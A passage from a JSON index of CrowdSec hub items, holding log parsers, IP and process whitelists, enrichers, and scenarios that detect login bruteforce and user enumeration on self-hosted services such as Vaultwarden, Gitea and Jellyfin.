"versions": {"0.1": {"digest": "b03afaaff75e627a5e80108364233efe44f04e83056c18acde8a5f7671969f31"}, "0.2": {"digest": "6d27023413439c2b47ee1ac8de963e10e96c28a5f717b31b0c0c4deb24af5654"}}}, "xs539/joplin-server-logs": {"content": "onsuccess: next_stage\nfilter: \"Lower(evt.Parsed.program) in ['joplin-server']\"\nname: xs539/joplin-server-logs\ndescription: \"Parse Joplin Server logs\"\npattern_syntax:\n  JOPLIN_DATE: \"%{YEAR}[/-]%{MONTHNUM2}[/-]%{DAY2} %{HOUR}:%{MINUTE}:%{SECOND}\"\nnodes:\n  - grok:\n      pattern: '%{JOPLIN_DATE:timestamp}%{GREEDYDATA}/api/sessions: %{IPORHOST:remote_addr}%{GREEDYDATA}Invalid username or password%{GREEDYDATA}\"%{EMAILADDRESS:target_user}\"'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: joplin_server_failed_auth\n        - meta: target_user\n          expression: evt.Parsed.target_user\nstatics:\n    - meta: service\n      value: joplin\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n    - meta: source_ip\n      expression: evt.Parsed.remote_addr", "description": "Parse Joplin Server logs", "path": "parsers/s01-parse/xs539/joplin-server-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "ab679f8937f04d9800ce8153005b33c230b2d13fef690d727b30efd34d906703"}}}}, "postoverflows": {"crowdsecurity/auditd-nix-wrappers-whitelist-process": {"content": "name: crowdsecurity/auditd-nix-wrappers-whitelist-process\ndescription: \"Whitelist wrapped binaries in the Nix store\"\nwhitelist:\n  reason: \"Nix wrapped binaries\"\n  expression:\n    - |\n      evt.Overflow.Alert.GetScenario() == 'crowdsecurity/auditd-sus-exec' && all(evt.Overflow.Alert.Events, {.GetMeta('exe') matches '^\\\\/nix\\\\/store\\\\/[^\\\\/]+\\\\/bin\\\\/\\\\.[^\\\\/]+-wrapped$'})\n", "description": "Whitelist wrapped binaries in the Nix store", "path": "postoverflows/s01-whitelist/crowdsecurity/auditd-nix-wrappers-whitelist-process.yaml", "stage": "s01-whitelist", "version": "0.1", "versions": {"0.1": {"digest": "9d0f701440ee0660eef69638e9279dc0137c00a8afb152abaabcfe7e351ee4a5"}}}, "crowdsecurity/auditd-nvm-whitelist-process": {"content": "name: crowdsecurity/auditd-nvm-whitelist-process\ndescription: \"Whitelist node version manager\"\nwhitelist:\n  reason: \"node version manager\"\n  expression: \n    - |\n      evt.Overflow.Alert.GetScenario() == 'crowdsecurity/auditd-sus-exec' && all(evt.Overflow.Alert.Events, {.GetMeta('exe') matches '\\\\.nvm\\\\/versions\\\\/node\\\\/v(\\\\d+)\\\\.(\\\\d+)\\\\.(\\\\d+)\\\\/bin\\\\/node$'})", "description": "Whitelist node version manager", "path": "postoverflows/s01-whitelist/crowdsecurity/auditd-nvm-whitelist-process.yaml", "stage": "s01-whitelist", "version": "0.1", "versions": {"0.1": {"digest": "9198b74cb5a3913746bd926b58a35f90682acd1c49e89a19e1162f2e209b32f9"}}}, "crowdsecurity/auditd-whitelisted-process": {"content": "name: crowdsecurity/auditd-whitelisted-process\ndescription: \"Whitelist some process that are false-positives prone\"\nwhitelist:\n  reason: \"package managers\"\n  expression: \n    - \"all(evt.Overflow.Alert.Events, {.GetMeta('parent_progname') in ['/usr/bin/dpkg', '/usr/bin/dnf']})\"\n", "description": "Whitelist some process that are false-positives prone", "path": "postoverflows/s01-whitelist/crowdsecurity/auditd-whitelisted-process.yaml", "stage": "s01-whitelist", "version": "0.2", "versions": {"0.1": {"digest": "c6162d811539d4b670a705f2db949621fd9116b650acaacd19728e20e8a8731f"}, "0.2": {"digest": "cbaa6a494e48137d2d64d7782669f9d4bac23a7aa8fed24e4c25790a3e3a33e0"}}}, "crowdsecurity/cdn-arvan-whitelist": {"content": "name: crowdsecurity/cdn-arvan-whitelist\ndescription: \"Whitelist CDN Arvan providers\"\nwhitelist:\n  reason: \"CDN Arvan provider\"\n  expression: \n    - \"any(File('arvancloud_ips.txt'), { IpInRange(evt.Overflow.Alert.Source.IP ,#)})\"\ndata:\n  - source_url: https://www.arvancloud.ir/en/ips.txt\n    dest_file: arvancloud_ips.txt\n    type: string", "description": "Whitelist CDN Arvan providers", "path": "postoverflows/s01-whitelist/crowdsecurity/cdn-arvan-whitelist.yaml", "stage": "s01-whitelist", "version": "0.1", "versions": {"0.1": {"digest": "6abb482f96c1ac951932622112b56cd96dcca8579df7253ca58d151dfe02369f"}}}, "crowdsecurity/cdn-qc-whitelsit": {"content": "name: crowdsecurity/quic-cdn-whitelist\ndescription: \"Whitelist CDN provider QUIC.cloud\"\nwhitelist:\n  reason: \"CDN provider QUIC.cloud\"\n  expression: \n    - \"evt.Overflow.Alert.Source.IP in File('quic_cloud_ips.txt')\"\n\ndata:\n  - source_url: https://www.quic.cloud/ips?ln\n    dest_file: quic_cloud_ips.txt\n    type: string\n\n", "description": "Whitelist CDN provider QUIC.cloud", "path": "postoverflows/s01-whitelist/crowdsecurity/cdn-qc-whitelsit.yaml", "stage": "s01-whitelist", "version": "0.1", "versions": {"0.1": {"digest": "cf604274ad512352979398bb20f33adc2c84a71b84810eb802bd9e7ca03bca0c"}}}, "crowdsecurity/cdn-whitelist": {"content": "name: crowdsecurity/cdn-whitelist\ndescription: \"Whitelist CDN providers\"\nwhitelist:\n  reason: \"CDN provider\"\n  expression: \n    - \"any(File('cloudflare_ips.txt'), { IpInRange(evt.Overflow.Alert.Source.IP ,#)})\"\n    - \"any(File('cloudflare_ip6s.txt'), { IpInRange(evt.Overflow.Alert.Source.IP ,#)})\"\ndata:\n  - source_url: https://www.cloudflare.com/ips-v4\n    dest_file: cloudflare_ips.txt\n    type: string\n  - source_url: https://www.cloudflare.com/ips-v6\n    dest_file: cloudflare_ip6s.txt\n    type: string\n", "description": "Whitelist CDN providers", "path": "postoverflows/s01-whitelist/crowdsecurity/cdn-whitelist.yaml", "stage": "s01-whitelist", "version": "0.4", "versions": {"0.1": {"digest": "d1cb42fbe9f3bb37f3cfa77ef5c60ec0b17dc3703bffb0d422dc6fe9cc0eb9f5"}, "0.2": {"digest": "7fb5b1474067c22192cf12effb7d508e316c130900cb00c108c0467d18d9d2c0"}, "0.3": {"digest": "63c933b81052c7776deb607ed7c115b89e59a88908123e04573853201122a45a"}, "0.4": {"digest": "626bd74a8f0dcf8e17d74238d08983693f5ac2d32b1a6ccd2d57fff02731eeaa"}}}, "crowdsecurity/cookiebot-whitelist": {"content": "name: crowdsecurity/cookiebot-whitelist\ndescription: \"Whitelist events from cookiebot compliance scanner\"\nwhitelist:\n  reason: \"Cookiebot compliance scanner ip address\"\n  expression: \n    - \"evt.Overflow.Alert.Source.IP in File('cookiebot_ips.txt')\"\n\ndata:\n  - source_url: https://hub-data.crowdsec.net/whitelists/benign_bots/cookiebot_ips.txt\n    dest_file: cookiebot_ips.txt\n    type: string", "description": "Whitelist events from cookiebot compliance scanner", "path": "postoverflows/s01-whitelist/crowdsecurity/cookiebot-whitelist.yaml", "stage": "s01-whitelist", "version": "0.2", "versions": {"0.1": {"digest": "7fd91de8bae664730d4165c670dff1d0d56a9cf1645d54978ae90241b14aa32a"}, "0.2": {"digest": "5ca0193a0a85c2e44e38caddaba705c4c2779c059845730225b185606cd103ca"}}}, "crowdsecurity/discord-crawler-whitelist": {"content": "name: crowdsecurity/discord-crawler-whitelist\ndescription: Discord PTR whitelist\nwhitelist:\n  reason: Discord PTR domain\n  expression:\n    - evt.Enriched.reverse_dns endsWith '.ptr.discord.com.'", "description": "Discord PTR whitelist", "path": "postoverflows/s01-whitelist/crowdsecurity/discord-crawler-whitelist.yaml", "stage": "s01-whitelist", "version": "0.1", "versions": {"0.1": {"digest": "d8eaee4f1ad3496ef253915ce0099d3c0cc2160785877efe306af35ffff929db"}}}, "crowdsecurity/ipv6_to_range": {"content": "onsuccess: next_stage\nfilter: \"evt.Overflow.Alert.Remediation == true && IsIPV6(evt.Overflow.Alert.Source.IP)\"\nname: crowdsecurity/ipv6_to_range\ndescription: \"\"\nstatics:\n  - target: evt.Overflow.Alert.Source.Value\n    expression: IpToRange(evt.Overflow.Alert.Source.IP, \"/64\")\n  - target: evt.Overflow.Alert.Source.Scope\n    value: Range", "path": "postoverflows/s00-enrich/crowdsecurity/ipv6_to_range.yaml", "stage": "s00-enrich", "version": "0.1", "versions": {"0.1": {"digest": "f22e5224b84175284024f9ca69e0c97327f0e0d86ff3ccfadf4f26257bf22b96"}}}, "crowdsecurity/rdns": {"content": "onsuccess: next_stage\nfilter: \"evt.Overflow.Alert.Remediation == true && evt.Overflow.Alert.GetScope() == 'Ip'\"\nname: crowdsecurity/rdns\ndescription: \"Lookup the DNS associated to the source IP only for overflows\"\nstatics:\n  - method: reverse_dns\n    expression: evt.Overflow.Alert.Source.IP\n  - meta: reverse_dns\n    expression: evt.Enriched.reverse_dns\n", "description": "Lookup the DNS associated to the source IP only for overflows", "path": "postoverflows/s00-enrich/crowdsecurity/rdns.yaml", "stage": "s00-enrich", "version": "0.3", "versions": {"0.1": {"digest": "796da42b262fe6574d78a7c7f95f73876d30a07751679a43afd018fc272e490a"}, "0.2": {"digest": "2b174b379f05edb3aa298b7037f6a85cde06b45893e4152492a51757408d517b"}, "0.3": {"digest": "e3f9e78178f48fc67f15137e092d65785c39c9308217a44e412987b8b06ac5ae"}}}, "crowdsecurity/seo-bots-whitelist": {"content": "name: crowdsecurity/seo-bots-whitelist\ndescription: \"Whitelist good search engine crawlers\"\nwhitelist:\n  reason: \"good bots (search engine crawlers)\"\n  expression: \n    - \"any(File('rdns_seo_bots.txt'), { len(#) > 0 && evt.Enriched.reverse_dns endsWith #})\"\n    - \"RegexpInFile(evt.Enriched.reverse_dns, 'rdns_seo_bots.regex')\"\n    - \"any(File('ip_seo_bots.txt'), { len(#) > 0 && IpInRange(evt.Overflow.Alert.Source.IP ,#)})\"\ndata:\n  - source_url: https://hub-data.crowdsec.net/whitelists/benign_bots/search_engine_crawlers/rdns_seo_bots.txt\n    dest_file: rdns_seo_bots.txt\n    type: string\n  - source_url: https://hub-data.crowdsec.net/whitelists/benign_bots/search_engine_crawlers/rnds_seo_bots.regex\n    dest_file: rdns_seo_bots.regex\n    type: regexp\n  - source_url: https://hub-data.crowdsec.net/whitelists/benign_bots/search_engine_crawlers/ip_seo_bots.txt\n    dest_file: ip_seo_bots.txt\n    type: string", "description": "Whitelist good search engine crawlers", "path": "postoverflows/s01-whitelist/crowdsecurity/seo-bots-whitelist.yaml", "stage": "s01-whitelist", "version": "0.5", "versions": {"0.1": {"digest": "6df83947191a61ab73a87fccb3c285563bd9c4b3ef8027558d3510d262776ebe"}, "0.2": {"digest": "71eccc355bf181addcb1b5681c5fa99e087b23cbd8fed40ade7ff8a3b07488ef"}, "0.3": {"digest": "43968bb27b6f8cb8420bdcfa997627bce5f19e62fb96299af8c0e1e767ff0582"}, "0.4": {"digest": "f48b0841cc4cf03fe16f118ea1b5d64f4c1eb07cbacf4647bb0e871b4fd71f8c"}, "0.5": {"digest": "504c16dd87df828742e360a304f3e945c2e03537d7a7610e869f315d721c395a"}}}}, "scenarios": {"Dominic-Wagner/vaultwarden-bf": {"content": "# vaultwarden bruteforce\ntype: leaky\nname: Dominic-Wagner/vaultwarden-bf\ndescription: \"Detect vaultwarden bruteforce\"\nfilter: \"evt.Meta.log_type in ['vaultwarden_failed_auth', 'vaultwarden_failed_admin_auth', 'vaultwarden_failed_2fa_totp', 'vaultwarden_failed_2fa_email']\"\nleakspeed: 1m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n  service: vaultwarden\n  behavior: \"generic:bruteforce\"\n  classification:\n    - attack.T1110\n  label: \"Vaultwarden Bruteforce\"\n  spoofable: 0\n  confidence: 3\n  remediation: true\n---\n# vaultwarden user-enum\ntype: leaky\nname: Dominic-Wagner/vaultwarden-bf_user-enum\ndescription: \"Detect vaultwarden user enum bruteforce\"\nfilter: evt.Meta.log_type == 'vaultwarden_failed_auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nleakspeed: 1m\ncapacity: 5\nblackhole: 5m\nreprocess: true\nlabels:\n  service: vaultwarden\n  behavior: \"generic:bruteforce\"\n  classification:\n    - attack.T1589\n    - attack.T1110\n  label: \"Vaultwarden User Enumeration\"\n  spoofable: 0\n  confidence: 3\n  remediation: true\n", "description": "Detect vaultwarden bruteforce", "path": "scenarios/Dominic-Wagner/vaultwarden-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "7cfd47daccee7ae3c88be9d772610996114d36be9a4738274ae54509c67e6615"}, "0.2": {"digest": "d1a3c008d9c42712cc330c7d89eba463ce7cedff495f6ae176df15e518a13ad2"}, "0.3": {"digest": "ea4f2a87fe328ff1d2e3ade4935447fdf876c52ffa68a72acf8b44adfb6a7019"}}}, "Jgigantino31/ntfy-bf": {"content": "# ntfy BF scan\nname: Jgigantino31/ntfy-bf\ndescription: \"Detect ntfy bruteforce\"\nfilter: \"evt.Meta.log_type == 'ntfy_failed_auth'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: 20s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: ntfy\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1110\n  label: \"Ntfy Bruteforce\"\n  remediation: true\n", "description": "Detect ntfy bruteforce", "path": "scenarios/Jgigantino31/ntfy-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "236a1ad777429f86916311042d1123873407b40f0a955154cf52783f27e86198"}}}, "LePresidente/adguardhome-bf": {"content": "# AdGuardHome bruteforce\ntype: leaky\nname: LePresidente/adguardhome-bf\ndescription: \"Detect AdGuardHome bruteforce attacks\"\nfilter: \"evt.Meta.log_type == 'adguardhome_failed_auth'\"\nleakspeed: 1m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n  service: adguardhome\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1110\n  label: \"AdGuardHome Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n", "description": "Detect AdGuardHome bruteforce attacks", "path": "scenarios/LePresidente/adguardhome-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "af3af350da974cdb51f8dd66b3daae62253719680738a3190b5b48ba7a3fab46"}, "0.2": {"digest": "9e4167549d0e3393b31985309f36cbf21fa823f3ad444f9176ac03771fc718a0"}}}, "LePresidente/authelia-bf": {"content": "# authelia BF scan\nname: LePresidente/authelia-bf\ndescription: \"Detect authelia bruteforce\"\nfilter: \"evt.Meta.service == 'authelia' && evt.Meta.log_type == 'auth_failed'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"20s\"\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: authelia\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1110\n  label: \"Authelia Bruteforce\"\n  remediation: true\n---\n# authelia user-enum\ntype: leaky\nname: LePresidente/authelia-bf_user-enum\ndescription: \"Detect authelia user enum bruteforce\"\nfilter: \"evt.Meta.service == 'authelia' && evt.Meta.log_type == 'auth_failed'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: authelia\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1589\n    - attack.T1110\n  label: \"Authelia User Enumeration\"\n  remediation: true\n", "description": "Detect authelia bruteforce", "path": "scenarios/LePresidente/authelia-bf.yaml", "version": "0.4", "versions": {"0.1": {"digest": "6859d59edc2371a1b44babd0623f0f4db16feacb2096450ebc19a6804343bc28"}, "0.2": {"digest": "444cade77860d8cf730df8ca3ddcf728e2246c4c2c72685fd425dedd7ee26457"}, "0.3": {"digest": "e6f9ef547cd23ab4b260709481c65f8c34ce2a19e2bced8229f74dbe91e7191f"}, "0.4": {"digest": "f1ceb17909865a123fbbcb01640e2e1b30524414e88a93dae90abc5cd86bdb0a"}}}, "LePresidente/emby-bf": {"content": "# emby bruteforce\ntype: leaky\nname: LePresidente/emby-bf\ndescription: \"Detect emby bruteforce\"\nfilter: \"evt.Meta.log_type == 'emby_failed_auth'\"\nleakspeed: 1m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n  service: emby\n  behavior: \"http:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Emby Bruteforce\"\n  remediation: true\n", "description": "Detect emby bruteforce", "path": "scenarios/LePresidente/emby-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "4465206dcabe80edd026332b3a1aca8feb325fe982fa8fd2b4a38a3970a258b1"}, "0.2": {"digest": "53face55d2ab8e746503000657d65d19257de7ef3ee3ae6b54bdb1fd8a5b3514"}}}, "LePresidente/gitea-bf": {"content": "# gitea BF scan\nname: LePresidente/gitea-bf\ndescription: \"Detect gitea bruteforce\"\nfilter: \"evt.Meta.log_type == 'gitea_failed_auth'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"20s\"\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: gitea\n  behavior: \"vcs:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Gitea Bruteforce\"\n  remediation: true\n---\n# gitea user-enum\ntype: leaky\nname: LePresidente/gitea-bf_user-enum\ndescription: \"Detect gitea user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'gitea_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: gitea\n  behavior: \"vcs:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1589\n    - attack.T1110\n  label: \"Gitea User Enumeration\"\n  remediation: true\n", "description": "Detect gitea bruteforce", "path": "scenarios/LePresidente/gitea-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "29eb0131d95219fa3a835a9e33cf38238240e42e8d7b46aa7bf7ed895d2b0b35"}, "0.2": {"digest": "2ba7cd0dc64eda94f1c094b45f1bffd779a3e773621fddb7506b713320406f54"}, "0.3": {"digest": "785e6e7e0e3f272a1555df16cbcdb38b5fef4638eb7feae97adff583507004ed"}}}, "LePresidente/grafana-bf": {"content": "# grafana BF scan\nname: LePresidente/grafana-bf\ndescription: \"Detect grafana bruteforce\"\nfilter: \"evt.Meta.service == 'grafana' && evt.Meta.log_type == 'auth_failed'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"20s\"\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: grafana\n  behavior: \"http:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Grafana Bruteforce\"\n  remediation: true\n", "description": "Detect grafana bruteforce", "path": "scenarios/LePresidente/grafana-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "f2b73db0cdd22c800e107a8dd0ab81d55bca7379a36f04dd26951dbebe9db1bb"}, "0.2": {"digest": "46b13a1c833edb5dc62f2c23d642eeaa1bdcb9c9e71bb890054cf2db3346652c"}, "0.3": {"digest": "33fffd89e58b5e67839e70a04dca4b8dc56fe45c36df2a3f8448b28ded619f68"}}}, "LePresidente/harbor-bf": {"content": "# harbor BF scan\nname: LePresidente/harbor-bf\ndescription: \"Detect harbor bruteforce\"\nfilter: \"evt.Meta.log_type == 'harbor_failed_auth'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"20s\"\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: harbor\n  behavior: \"http:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Harbor Bruteforce\"\n  remediation: true\n---\n# harbor user-enum\ntype: leaky\nname: LePresidente/harbor-bf_user-enum\ndescription: \"Detect harbor user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'harbor_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: harbor\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1589\n    - attack.T1110\n  label: \"Harbor User Enumeration\"\n  remediation: true\n", "description": "Detect harbor bruteforce", "path": "scenarios/LePresidente/harbor-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "25f208be5fdb655805f5b9baed7784d6b0be07421f9c36d53b85400a778f9e3c"}, "0.2": {"digest": "a103754c82c2d9bd394229759091cdbda5f0cdfff89ed1a1acc1422197249432"}}}, "LePresidente/jellyfin-bf": {"content": "# jellyfin BF scan\nname: LePresidente/jellyfin-bf\ndescription: \"Detect jellyfin bruteforce\"\nfilter: \"evt.Meta.log_type == 'jellyfin_failed_auth'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: 20s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: jellyfin\n  behavior: \"http:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Jellyfin Bruteforce\"\n  remediation: true\n---\n# jellyfin user-enum\ntype: leaky\nname: LePresidente/jellyfin-bf_user-enum\ndescription: \"Detect jellyfin user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'jellyfin_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 1m\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: jellyfin\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1589\n    - attack.T1110\n  label: \"Jellyfin User Enumeration\"\n  remediation: true\n", "description": "Detect jellyfin bruteforce", "path": "scenarios/LePresidente/jellyfin-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "e84cce05fb525b5f43f34171fb8a3eeca55ae5a7e5553d59fd9004472188706e"}, "0.2": {"digest": "adc51e35b2fe0f667938d7ddea7bd9fd5ff9f48c1ac3438b871130c0be251689"}, "0.3": {"digest": "5179188991ad374eca09847c1faff88e6cfed3dd80c5fe2a0b662d9b0056cd62"}}}, "LePresidente/jellyseerr-bf": {"content": "# jellyseerr BF scan\nname: LePresidente/jellyseerr-bf\ndescription: \"Detect jellyseerr bruteforce\"\nfilter: \"evt.Meta.log_type == 'jellyseerr_failed_auth'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: 20s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: jellyseerr\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1110\n  label: \"Jellyseerr Bruteforce\"\n  remediation: true\n---\n# jellyseerr user-enum\ntype: leaky\nname: LePresidente/jellyseerr-bf_user-enum\ndescription: \"Detect jellyseerr user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'jellyseerr_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 1m\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: jellyseerr\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1589\n    - attack.T1110\n  label: \"Jellyseerr User Enumeration\"\n  remediation: true\n", "description": "Detect jellyseerr bruteforce", "path": "scenarios/LePresidente/jellyseerr-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "d21fcd58a65208cd0d37d005e13b3ba242f169ee71a8a8c2b6d4c4011f4d1c98"}, "0.2": {"digest": "230e8b4b1ef48c3cb5f83ccc66ca29e38d83f4116079f22cb13033e0c7e40bc8"}, "0.3": {"digest": "67de16da36ac83872bb2e9cd73a67ec7ba41dd1b4972817bb8f9cf767054ff4d"}}}, "LePresidente/ombi-bf": {"content": "# emby bruteforce\ntype: leaky\nname: LePresidente/ombi-bf\ndescription: \"Detect Ombi bruteforce\"\nfilter: \"evt.Meta.log_type == 'ombi_auth_failed'\"\nleakspeed: 1m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n  service: ombi\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1110\n  label: \"Ombi Bruteforce\"\n  remediation: true\n", "description": "Detect Ombi bruteforce", "path": "scenarios/LePresidente/ombi-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "20d3c7bf14fa9c1a6b43a00d219c933846d36d7ec8d4306659aaad6a3873a6eb"}, "0.2": {"digest": "57fdcee57a59e2858e2eb25e60004d4a9910ed20c2856443eda997a3153a2300"}}}, "LePresidente/overseerr-bf": {"content": "# overseerr BF scan\nname: LePresidente/overseerr-bf\ndescription: \"Detect overseerr bruteforce\"\nfilter: \"evt.Meta.log_type == 'overseerr_failed_auth'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"20s\"\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: overseerr\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1110\n  label: \"Overseerr Bruteforce\"\n  remediation: true\n---\n# overseerr user-enum\ntype: leaky\nname: LePresidente/overseerr-bf_user-enum\ndescription: \"Detect overseerr user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'overseerr_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: overseerr\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1589\n    - attack.T1110\n  label: \"Overseerr User Enumeration\"\n  remediation: true\n", "description": "Detect overseerr bruteforce", "path": "scenarios/LePresidente/overseerr-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "bd3d03dc43e0bdc90e71ef791c938ec722fee0ed07165e0155804a6da29abf27"}, "0.2": {"digest": "c507f748764cc42d4e71d3cbd0399c1f303aff386e629e499cd09047fd689dc1"}}}, "LePresidente/redmine-bf": {"content": "# Redmine bruteforce\ntype: leaky\nname: LePresidente/redmine-bf\ndescription: \"Detect Redmine bruteforce attacks\"\nfilter: \"evt.Meta.log_type == 'redmine_failed_auth'\"\nleakspeed: 1m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n  service: redmine\n  behavior: \"http:bruteforce\"\n  classification:\n    - attack.T1110\n  label: \"Redmine Bruteforce\"\n  spoofable: 0\n  confidence: 3\n  remediation: true\n---\n# Redmine user-enum\ntype: leaky\nname: LePresidente/redmine-bf_user-enum\ndescription: \"Detect Redmine user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'redmine_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: redmine\n  behavior: \"http:bruteforce\"\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1589\n    - attack.T1110\n  label: \"Redmine Enumeration\"\n  remediation: true\n", "description": "Detect Redmine bruteforce attacks", "path": "scenarios/LePresidente/redmine-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "85e4eb99ed510675a3b9080958f5000e5c7564e63bd3fa180be3a5757620ec8e"}, "0.2": {"digest": "d12851449afd02091b0d5838de8daebbc6cc81847cfb26a1afed2c6eb2b4f176"}}}, "LePresidente/ssh-bad-keyexchange-bf": {"content": "# ssh bruteforce\ntype: leaky\nname: lepresidente/ssh-bad-keyexchange-bf\ndescription: \"Detect ssh bad key exchange\"\nfilter: \"evt.Meta.log_type == 'ssh_bad_keyexchange'\"\nleakspeed: \"10s\"\nreferences:\n  - http://wikipedia.com/ssh-bf-is-bad\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: ssh\n  behavior: \"ssh:bruteforce\"\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  remediation: true\n  label: \"SSH Bad Key Bruteforce\"\n", "description": "Detect ssh bad key exchange", "path": "scenarios/LePresidente/ssh-bad-keyexchange-bf.yaml", "references": ["http://wikipedia.com/ssh-bf-is-bad"], "version": "0.2", "versions": {"0.1": {"digest": "654f4cd2d1f53a60423647e3d8ec38cde2e27a7b8495c44204f001f5f5485430"}, "0.2": {"digest": "3c1b4148eedb8f632dc80ed11a186c7d534ce23533367ab3c8e3cd06345d6a2a"}}}, "LearningSpot/baserow-bf": {"content": "type: leaky\nname: LearningSpot/baserow-bf\ndescription: \"Detect failed login for Baserow\"\nfilter: \"evt.Meta.log_type == 'baserow_failed_login' && evt.Meta.status == '401'\"\ngroupby: evt.Meta.source_ip\nleakspeed: 1m\ncapacity: 5\nblackhole: 5m\nlabels:\n  service: baserow\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Baserow Bruteforce\"\n  confidence: 3\n  spoofable: 0\n  remediation: true\n", "description": "Detect failed login for Baserow", "path": "scenarios/LearningSpot/baserow-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "d7fbfc4836df5d26d8a3b956491095c4a818382c5305829c6fbd4f13e892e87b"}, "0.2": {"digest": "fe23ff784c5ad504a2e93f4cf8f1d4c8f052dfb87ee5bf2b18fad176ae62eb37"}}}, "LearningSpot/dockge-bf": {"content": "# Dockge Bruteforce\ntype: leaky\nname: LearningSpot/dockge-bf\ndescription: \"Detect Dockge Bruteforce\"\nfilter: 